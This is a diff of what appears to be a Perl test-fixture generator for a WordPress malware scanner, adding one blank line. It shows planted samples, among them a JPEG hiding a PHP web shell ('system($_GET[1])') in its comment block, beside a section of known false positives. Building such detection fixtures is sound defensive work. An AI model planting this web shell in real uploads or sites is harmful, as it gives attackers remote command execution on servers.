@@ -109,6 +109,7 @@ w('wp-content/uploads/2026/10/appended-big.jpg', $jpg . ("\x00" x 400000) . '<?p
 # PHP in EXIF/comment block right after the JPEG header
 w('wp-content/uploads/2026/10/exif-php.jpg', "\xff\xd8\xff\xfe\x00\x1c<?php system(\$_GET[1]); ?>" . ("\x00" x 400000) . "\xff\xd9");
 
+
 # ---------------- known false positives: must stay quiet/ignored ----------------
 w('legit/php/hex-lookup-table.php', $P .
   'static $ASCII = "' . hex_esc(' eiasntroludcmpgfbhvyqwkxjzEIASNTROLUD') . '";' . "\n");
